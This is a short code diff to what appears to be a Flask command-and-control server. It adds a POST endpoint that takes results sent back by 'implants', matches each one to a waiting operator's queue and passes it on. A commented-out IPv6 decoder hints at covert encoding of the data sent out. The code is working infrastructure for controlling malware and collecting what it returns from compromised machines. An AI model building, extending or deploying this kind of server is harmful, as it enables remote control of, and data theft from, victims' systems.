@@ -446,6 +446,29 @@ def catch_all_post(path):
         return "error"
 
 
+@app.route('/un/<path:path>', methods=['POST'])
+def unencoded_post(path):
+    """
+    """
+    try:
+        logger.info(f"{path} sending us data")
+        # Get the data
+        result = request.get_json()
+        # The result comes in as a JSON object under the field msg
+        result = result.get("msg")
+        # Check which operator is waiting for a result
+        queue = implant_checkout[path]
+        logger.info("got queue for operator")
+        operator = queue.get()
+        logger.info(f"sending {operator} command")
+        # decoded_res = ipv6_encoder.ipv6_to_string(result.split("\n"))
+        handle_update(operator, path, result)
+        return "200"
+    except Exception as e:
+        logger.error(f"error getting data: {e}")
+        return "error"
+
+
 def start_flask():
     app.run()
 
